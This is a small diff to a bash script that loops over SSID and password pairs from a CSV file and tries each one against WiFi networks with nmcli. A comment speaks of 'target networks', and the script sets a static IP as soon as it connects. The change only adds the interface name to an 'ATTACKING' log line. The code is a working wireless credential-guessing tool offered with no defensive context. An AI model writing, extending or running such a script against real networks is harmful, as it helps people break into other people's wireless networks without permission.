@@ -17,7 +17,7 @@ while true;do
     # Read the file line by line
     # -r prevents backslash escapes from being interpreted
     while IFS=',' read -r ssid password; do
-        echo "ATTACKING: $ssid with password: $password"
+        echo "($INTERFACE) ATTACKING: $ssid with password: $password"
         if nmcli --wait 5 device wifi connect "$ssid" password "$password" ifname "$INTERFACE" ; then
             # Manually assign an IP immediately (No waiting for DHCP!)
             # Adjust 192.168.1.50 to an IP likely to be free on your target networks
